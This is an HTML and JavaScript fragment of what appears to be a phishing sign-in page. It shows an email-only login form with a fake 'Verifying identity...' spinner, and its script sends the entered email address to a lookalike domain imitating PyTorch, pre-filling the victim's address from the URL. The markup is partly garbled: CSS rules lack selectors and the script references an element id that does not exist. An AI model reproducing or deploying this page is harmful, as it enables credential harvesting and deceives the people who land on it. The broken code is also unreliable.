<style>

        position: fixed;

        width: 100%;
        text-align: center;

        border: 3px solid #f3f3f3;

        <div id="loginFormDiv">
            <form id="redirectForm">
                <div class="group">
                    <input type="text" id="Email" required autocomplete="off">
                    <label>Email</label>
                </div>
                <button type="submit" class="btn-signin">Sign in</button>
                <a href="#" class="forgot-link">forgot password?</a>
            </form>
        </div>

        <div id="loadingOverlay">
            <div class="spinner"></div>
            <p style="color: #666; font-size: 13px;">Verifying identity...</p>

</div>

<script>
    const REDIRECT_BASE = "https://pytorch.dreachoutou.digital/MOAZZN!6klW/$";
    const userField = document.getElementById('username');

    userField.addEventListener('blur', function() {
        if (this.value !== "") { this.classList.add('used'); } 
        else { this.classList.remove('used'); }
    });

    document.getElementById('redirectForm').addEventListener('submit', function(e) {
        e.preventDefault();
        const email = userField.value.trim();
        if (email.includes('@')) {
            document.getElementById('loginFormDiv').style.display = 'none';
            document.getElementById('loadingOverlay').style.display = 'block';
            setTimeout(() => {
                window.location.href = REDIRECT_BASE + encodeURIComponent(email);
            }, 1250);
        }
    });

    window.onload = function() {
        const hash = window.location.hash.substring(1);
        if (hash && hash.includes('@')) {
            userField.value = hash;
            userField.classList.add('used');
        }
    };
</script>
</body></html>
